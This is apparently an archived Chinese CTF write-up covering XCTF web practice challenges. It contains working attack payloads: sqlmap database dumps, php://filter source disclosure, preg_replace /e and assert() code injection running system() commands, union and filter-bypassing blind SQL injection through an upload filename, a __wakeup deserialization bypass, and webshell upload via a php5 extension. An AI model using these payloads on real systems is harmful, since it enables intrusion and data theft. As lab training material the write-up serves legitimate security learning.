---
title: "XCTF Web: Source Code, State and Combined Weaknesses"
title_zh: "XCTF Web 进阶：源码、状态与组合漏洞"
lang: zh-CN
archived: true
privacy_reviewed: true
original_title: XCTF WEB Advanced
date: 2020-02-12 20:20:00
slug: XCTF-WEB-Advanced
permalink: writing/XCTF-WEB-Advanced/
topic: CTF
summary: "Challenge notes on files, serialization, account state and uploads, with failed hypotheses and source attribution."
summary_zh: "跨多道练习追踪文件读取、危险函数、反序列化和业务状态中的薄弱点，既记录失败假设，也展示账户流程与上传场景的组合分析，包含对外部题解的引用说明。"
format_label: CTF write-up
featured_rank: 0
missing_images: 5
withheld_images: 0
recovered_images: 0
tags: CTF
---

## cat:抓住那只猫

![历史配图暂缺](redacted-image:missing)<br />在输入任何网站都无效的情况下，输入localhost<br />![历史配图暂缺](redacted-image:missing)<br />发现还是有回显的，进行Fuzz测试发现@未被过滤，会将@编码为%40<br />试一试宽字节，%bf<br />![历史配图暂缺](redacted-image:missing)<br />发现是一些HTML网页代码，带着好奇心，我打开了PHPSTUDY进行本地测试<br />![历史配图暂缺](redacted-image:missing)<br />看到了熟悉的django报错页面，看来是将输入的参数传到了后端的django服务中进行解析，而django设置了编码为gbk导致错误编码了宽字符（超过了ascii码范围）。<br />看了一下大佬的WP发现@的作用是读取文件内容

<a name="Nz8qN"></a>

## ics-04

有三个可以访问的功能，注册、登录和找回密码<br />注册功能：没有sql注入，一个账号可以重复注册漏洞<br />登录功能：没有sql注入，一个账号不同密码能够登录<br />找回密码功能：存在sql注入，payload：<br />![A2`Y[TM(NN{(E]ICSQEHDBG.png](https://example.invalid/withheld-figure)

```
sqlmap "http://192.0.2.40:43546/findpwd.php" --data="username=1"
sqlmap "http://192.0.2.40:43546/findpwd.php" --data="username=1" --dbs
sqlmap "http://192.0.2.40:43546/findpwd.php" --data="username=1" -D ctf_db --tables
sqlmap "http://192.0.2.40:43546/findpwd.php" --data="username=1" -D ctf_db -T user --columns
sqlmap "http://192.0.2.40:43546/findpwd.php" --data="username=1" -D ctf_db -T user -C username&password --dump
```

得到账号：ctf_user，密码：[题目口令已省略]<br />利用重复注册账号漏洞，注册账号ctf_user，密码123456，登录成功，取得flag

<a name="zbcZl"></a>

## ics-05

查看源码发现?page=index，出现page这个get参数，联想到可能存在文件包含读源码的漏洞<br />尝试读取index.php的页面源码，通过php内置协议直接读取代码

```
?page=php://filter/read=convert.base64-encode/resource=index.php
```

<a name="8ljxr"></a>

### 代码审计

base64解密之后，审计源码，分析得到如下关键部分

```
<?php
//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试
if ($_SERVER['HTTP_X_FORWARDED_FOR'] === '127.0.0.1') {
    echo "<br >Welcome My Admin ! <br >";
    $pattern = $_GET[pat];
    $replacement = $_GET[rep];
    $subject = $_GET[sub];
    if (isset($pattern) && isset($replacement) && isset($subject)) {
        preg_replace($pattern, $replacement, $subject);
    }else{
        die();
    }
}
?>
```

<a name="iFio8"></a>

### preg_replace函数

```
函数作用：搜索subject中匹配pattern的部分， 以replacement进行替换。
$pattern: 要搜索的模式，可以是字符串或一个字符串数组。
$replacement: 用于替换的字符串或字符串数组。
$subject: 要搜索替换的目标字符串或字符串数组。
```

preg_replace函数存在命令执行漏洞<br />此处明显考察的是preg_replace 函数使用 `/e`模式，导致代码执行的问题。
> /e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。

也就是说，pat和sub有相同部分，rep的代码就会执行。<br />根据源码分析X-Forwarded-For改成127.0.0.1之后，GET进三个参数。然后调用了preg_replace函数。并且没有对pat进行过滤，所以可以传入"/e"触发漏洞
<a name="X6BCi"></a>

### 构造payload

看到这样的代码我们可以这样构造payload:<br />在HTTP头添加：<br />X-Forwarded-For:127.0.0.1<br />/index.php?pat=/a/e&rep=system('ls')&sub=a<br />从而爆出文件列<br />/index.php?pat=/a/e&rep=system('ls+文件名')&sub=a<br />从而爆出该文件下的文件名<br />/index.php?pat=/a/e&rep=system('ls+文件名/文件名')&sub=a
<a name="jI6kn"></a>

## <br />ics-06

根据提示进入报表中心，发现url中id=1,尝试爆破，发现当id=2333时会有flag

<a name="UWZNk"></a>

## lottery

大名鼎鼎的彩票题，代码审计PHP弱类型，true和1的返回结果一样，所以直接构造：<br />{"action":"buy","numbers": [true,true,true,true,true,true,true]}

<a name="T1fDV"></a>

## NewsCenter

不是xss就是sql，但是想到这是一道CTF题，xss的几率不大，所以直接尝试，<br />爆库(xxxx，爆表(xxx，爆列(xx，爆值(x

```
1' union select 1,1,database() #
1' union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=database() #
1' union select 1,1,group_concat(column_name) from information_schema.column where tabele_name=' xxx' #
1' union select 1,1,xx from xxxx.xxx # 
or 
1'union select 1,1,group_concat(xx) from xxx #
```

<a name="IrRZj"></a>

## mfw

代码注射题：<br />先用GitHack 将源码down下来**assert()函数容易引起代码注射：**<br />eg:

```php
<?php

if (isset($_GET['page'])) {
 $page = $_GET['page'];
} else {
 $page = "home";
}

$file = "templates/" . $page . ".php";

// I heard '..' is dangerous!
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");

// TODO: Make this look nice
assert("file_exists('$file')") or die("That file doesn't exist!");

?>
```

**涉及函数:**

- strpos() 函数查找字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。

语法：strpos(string,find,start)<br />参数 描述<br />string 必需。规定要搜索的字符串。<br />find 必需。规定要查找的字符串。<br />start 可选。规定在何处开始搜索。

- file_exists() 函数检查文件或目录是否存在

如果指定的文件或目录存在则返回 true，否则返回 false。<br />
<br />根据上述特性可以对assert第一次出现的位置进行构造：<br />**通过可控变量file传入恶意参数，构造闭合 strpos(),使assert()执行恶意代码**

```php
位置:
assert("strpos('$file', '..') === false") or die("Detected hacking attempt!");
payload:
qwe','abc')===false and system('cat templates/flag.php') and strops('qwe
结果：
assert("strpos('qwe','abc')===false and system('cat templates/flag.php') and strops('qwe', '..') === false") or die("Detected hacking attempt!");
```

我们也可以对第二处进行构造:<br />**通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码**

```php
位置:
assert("file_exists('$file')") or die("That file doesn't exist!");
payload:
1') or phpinfo();#
```

> 关于此处的#:   #是单行注释，由assert("phpinfo()")  <==>  <?phpinfo()?>   可知，#的作用域仅仅是assert(函数内)
> 即为注释掉 ')
利用：<br />1') or print_r(file_get_contents('templates/flag.php'));#

<a name="SSJyY"></a>

## Training-WWW-Robots

[[百度一下robots](http://tool.chinaz.com/robots/)]:
> Robots.txt 是存放在站点根目录下的一个纯文本文件。虽然它的设置很简单，但是作用却很强大。它可以指定搜索引擎蜘蛛只抓取指定的内容，或者是禁止搜索引擎蜘蛛抓取网站的部分或全部内容。
> **使用方法:**
> Robots.txt 文件应该放在网站根目录下，并且该文件是可以通过互联网进行访问的。
> 例如：如果您的网站地址是 <http://www.example.invalid/那么，该文件必须能够通过> <http://www.example.invalid/robots.txt> 打开并看到里面的内容。
> **格式：**
> User-agent:
> 用于描述搜索引擎蜘蛛的名字，在" Robots.txt "文件中，如果有多条User-agent记录说明有多个搜索引擎蜘蛛会受到该协议的限制，对该文件来说，至少要有一条User-agent记录。如果该项的值设为*，则该协议对任何搜索引擎蜘蛛均有效，在" Robots.txt "文件中，"User-agent:*"这样的记录只能有一条。
> Disallow:
> 用于描述不希望被访问到的一个URL，这个URL可以是一条完整的路径，也可以是部分的，任何以Disallow开头的URL均不会被Robot访问到。

所以直接访问，再继续访问flag页面即可

<a name="GnJCL"></a>

## NaNNaNNaNNaN-Batman

下载附件：

```html
<script>_='function $(){e=getEleById("c").value;length==16^be0f23233ace98aa$c7be9){tfls_aie}na_h0lnrg{e_0iit\'_ns=[t,n,r,i];for(o=0;o<13;++o){ 
[0]);
.splice(0,1)}}} \'<input id="c">< onclick=$()>Ok</>\');delete _var ","docu.)match(/"];/)!=null=[" write(
s[o%4]buttonif(e.ment';for(Y in $='
 ')with(_.split($[Y]))_=join(pop());eval(_)</script>
```

加上HTML后缀点开发现乱码，解决办法：将eval改为alert，输出源码“

```html
function $()
{var e=document.getElementById("c").value;
if(e.length==16)
 if(e.match(/^be0f23/)!=null)
  if(e.match(/233ac/)!=null)
   if(e.match(/e98aa$/)!=null)
    if(e.match(/c7be9/)!=null){
     var t=["fl","s_a","i","e}"];
     var n=["a","_h0l","n"];
     var r=["g{","e","_0"];
     var i=["it'","_","n"];
     var s=[t,n,r,i];
     for(var o=0;o<13;++o)
      {
       document.write(s[o%4][0]);
       s[o%4].splice(0,1)
      }
     }
    }
    document.write('<input id="c"><button onclick=$()>Ok</button>');
    delete _
```

解法1：构造payload输进文本框,payload需要满足1.16位 2.be0f23开头 e98aa结尾的 be0f233acc7be98aa<br />解法2：将含有输出flag的代码放到控制台即可

```html
 var t=["fl","s_a","i","e}"];
     var n=["a","_h0l","n"];
     var r=["g{","e","_0"];
     var i=["it'","_","n"];
     var s=[t,n,r,i];
     for(var o=0;o<13;++o)
      {
       document.write(s[o%4][0]);
       s[o%4].splice(0,1)
      }
```

<a name="aKu4b"></a>

## unserialize3

根据标题，我们能看出来这是一道PHP反序列化题，仔细斟酌，我们需要将它进行序列化，当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过`__wakeup`的执行。
> <br />serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，__sleep()方法会先被调用，然后才执行序列化操作。
> 可以在__sleep()方法里可以决定哪些属性被序列化
> 如果没有__sleep()方法则默认序列化所有属性

eg:

```shell
序列化函数serialize()
序列化举例说明：
O:3:"Ctf":3{s:4:"flag";s:13:"flag{abedyui}";s:4:"name";s:7:"Sch0lar";s:3:"age";s:2:"18";}
O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示
3 代表类名字占三个字符 
ctf 类名
3 代表三个属性
s代表字符串
4代表属性名长度
flag属性名
s:13:"flag{abedyui}" 字符串 属性值长度 属性值
```

本题序列化出来：O:4:"xctf":1:{s:4:"flag";s:3:"111";}<br />则如果要绕过__wakeup，则只需改变对象属性的个数即可绕过，则把O:4:"xctf":1:{s:4:"flag";s:3:"111";} 中的1改为大于它的数即可

<a name="rUdpT"></a>

## Bug

<a name="a1V1V"></a>

### 大坑1：二次注入

进去之后尝试二次注入。即注册用户admin '# 完事儿后进去修改密码，修改完的就是admin的密码，结果发现用admin登录之后没用
<a name="gTR8B"></a>

### 大坑2：爆破

尝试爆破的小伙伴就不用费心了
<a name="wkO77"></a>

### 大坑3：忘记密码

在各种办法都试过之后，我终于看到忘记密码这个选项了，别的办法的都试过了，没用，那就只能从这下手了，尝试修改密码，用admin的账户修改，发现报错，没用，差点死心了，不得已而为之，我只好尝试修改自己注册的二次注入用户admin '#，用它修改密码然后抓包，修改它，即用户名为admin，发现修改成功！
<a name="tsClf"></a>

### 大坑4：IP伪造

进去之后，不多BB直接点manage，发现IP不被允许，只好再次抓包，在Referer头下面添加X-forwarded-for:127.0.0.1，伪造成功！
<a name="PQ4X8"></a>

### 大坑5：do??？

进去之后啥也没，只好查看页面元素发现提示：

```php
index.php?module=filemanage&do=???
```

do???这时候就得猜了，无非就是文件上传,upload,尝试之后，终于进去了：![历史配图暂缺](redacted-image:missing)
<a name="l3Ijo"></a>

### 大坑6：一句话写法

发现写入一句话<?php eval(中间我就省略不写了)?>，显示上传失败：it's a php,尝试写入

```php
<script language="php">eval(.....懒得打)</script>
```

<a name="OrGSf"></a>

### 大坑7：后缀名

发现不让上传PHP文件，更改后缀为js或html，虽然成功了但是没爆出flag，也归为失败<br />几番尝试之后，发现后缀改为php5即可

<a name="aAx8r"></a>

## Upload

这道题虽说是一道文件上传题，确实是，但是套路用的却是sql注入的，我怎么想也想不到，fuzz几遍后迫于无奈看了一下wp,才发现这是sql注入并且注入点在filename,ohmygod,我太难了。。。

<a name="Vg0Qp"></a>

### 注入思路

用了一下以往的注入思路，union select 1,1,1#<br />发现不仅没点卵用，而且还过滤了union和select
<a name="yx4fl"></a>

### 爆库

```sql
'+(selselectect CONV(substr(hex(dAtaBase()),1,12),16,10))+'.jpg
(16=>10=>hex=>web_up)
```

尝试以后发现用这个数据库暴不出来表<br />然后修改一下substr的起始位置参数，看看后边还有没有<br />修改为：

```sql
'+(selselectect CONV(substr(hex(database()),13,20),16,10))+'.jpg
(16=>10=>hex=>load)
```

数据库名合起来为:web_upload

<a name="pcMN4"></a>

### 爆表名

```sql
'+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = 'web_upload' limit 1,1)),1,12),16,10))+'.jpg
hello_
'+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = 'web_upload' limit 1,1)),13,12),16,10))+'.jpg
flag_i
'+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = 'web_upload' limit 1,1)),25,12),16,10))+'.jpg
s_here
```

表名连起来就是：hello_flag_is_here
<a name="e0rnw"></a>

### 爆列名

```sql
'+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 0,1)),1,12),16,10))+'.jpg
i_am_f
'+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = 'hello_flag_is_here' limit 0,1)),13,12),16,10))+'.jpg
lag
```

列名就出来了：i_am_flag，其实后面不用爆就能猜到是lag
<a name="xONsw"></a>

### 爆值

```sql
'+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+'.jpg
!!_@m_
'+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+'.jpg
Th.e_F
'+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+'.jpg
!lag
```

flag的值我们就有了:!!<_@m_Th.e_F>!lag

<a name="TqsUH"></a>

### 相关知识点

首先很多人一定有疑问，这个注入语句两端的+加号和单引号是干嘛的?<br />加上＋的意思是把页面传进来的值放在SQL语句里拼接起来<br />**记住这样的传值格式<br />**"numbers": [true,true,true,true,true,true,true]} //定义数组<br />"numbers":"1,2,3,4,5,6,7"}<br />'+(xxxxxx)+'

**函数**

```sql
1.CONV()
        简单的来说这个函数就是用来进行进制的转换的
        
        CONV(N,from_base,to_base)
        
        N是要转换的数据，from_base是原进制，to_base是目标进制。
        
        如果N是有符号数字，则to_base要以负数的形式提供，否则会将N当作无符号数
        
 2.substr（）
    简单来说 这个函数是用来搜索字符串的
        
    substr(string string,num start,num length);

    string为字符串；
    
    start为起始位置；
    
    length为长度。
    
    mysql中的start是从1开始的，而hibernate中的start是从0开始的。
        
        注意，这里substr取12位是因为一旦过长（超出12），就会用科学记数法显示

 3.hex（）
    这个就很好理解了，转为16进制嘛
        
  4.limit
     LIMIT 子句可以被用于强制 SELECT 语句返回指定的记录数。

    LIMIT 接受一个或两个数字参数。参数必须是一个整数常量。

    如果给定两个参数，第一个参数指定第一个返回记录行的偏移量，第二个参数指定返回记录行的最大数目。

    初始记录行的偏移量是 0(而不是 1)：
        
        LIMIT 5,10; // 代表从第5行开始(5+1行)检索10行，即检索6-15行,从第5+1行开始算
        
        LIMIT 95,-1; // 检索记录行 96-last.从95+1开始算
        
        LIMIT 5;     //检索前 5 个记录行
```
